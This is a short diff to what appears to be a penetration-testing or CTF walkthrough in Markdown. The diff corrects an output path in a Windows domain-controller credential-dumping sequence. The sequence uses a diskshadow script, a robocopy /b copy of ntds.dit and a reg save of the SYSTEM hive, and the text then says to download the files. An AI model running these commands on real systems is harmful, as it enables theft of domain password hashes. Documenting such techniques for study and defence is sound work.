@@ -256,7 +256,7 @@ diskshadow /s dishshadow.txt
 
 robocopy /b h:\windows\ntds . ntds.dit
 
-reg save hklm\system C:\Users\xyan1d3\AppData\Local\Temp
+reg save hklm\system C:\Users\xyan1d3\AppData\Local\Temp\system
 ```
 
 When you finished download `system` and `ntds.dir` files
